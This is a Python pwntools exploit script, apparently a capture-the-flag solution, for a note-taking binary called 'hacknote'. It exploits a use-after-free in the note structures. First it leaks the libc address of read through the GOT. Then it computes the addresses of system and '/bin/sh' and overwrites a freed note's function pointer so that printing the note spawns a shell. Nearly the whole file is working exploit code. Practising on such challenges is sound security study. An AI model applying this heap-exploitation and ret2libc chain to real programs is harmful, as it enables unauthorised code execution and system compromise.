#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'

r = process('./hacknote')
elf = ELF('./hacknote')

print_addr = elf.symbols['print_note_content']
print 'print_addr= ' + hex(print_addr)
read_got = elf.got['read']
print 'read_got= ' + hex(read_got)


def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))


def printnote(idx):
    r.recvuntil("Your choice :")
    r.sendline("3")
    r.recvuntil("Index :")
    r.sendline(str(idx))


#magic = 0x400B72

def leakGot():
    addnote(160, "aaaa")  # note 0, 160 not in fast bin
    addnote(160, "ddaa")  # note 1

    delnote(0)
#    gdb.attach(r)
    delnote(1)

    addnote(16, p64(print_addr) + p64(read_got)) #note2, leak read_got

    printnote(0)
    data = r.recvline(keepends=False)
    read_addr = u64(data.ljust(8,'\x00'))
    print 'read_addr= ' + hex(read_addr)

    '''
    libc = LibcSearcher('read', read_addr)
    system_addr = read_addr + (libc.dump('system') - libc.dump('read'))
    print 'system_addr= ' + hex(system_addr)
    bin_addr = read_addr + (libc.dump('str_bin_sh') - libc.dump('read'))
    print 'bin_addr= ' + hex(bin_addr)
    '''

    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    print 'libc_base=' + hex(read_addr - libc.symbols['read'])
    system_addr = read_addr + (libc.symbols['system'] - libc.symbols['read'])
    print 'system_addr= ' + hex(system_addr)
    bin_addr = read_addr + (next(libc.search('/bin/sh')) - libc.symbols['read'])
    print 'bin_addr= ' + hex(bin_addr)

    delnote(2)

    addnote(16, p64(system_addr) + p64(bin_addr))  # note3, call system(';$0) OR system('/bin/sh')

def leakMainArena():
    addnote(160, "aaaa")  # note 0, 160 not in fast bin
    addnote(160, "ddaa")  # note 1

    delnote(0)
    gdb.attach(r)
    addnote(160, 'a' * 8)
    printnote(0)  # note 0 content addr not changed, could use to leak
    data = r.recvline(keepends=False)
    read_addr = u64(data.ljust(8, '\x00'))
    print 'read_addr= ' + hex(read_addr)


leakGot()
#leakMainArena()

printnote(0)

r.interactive()
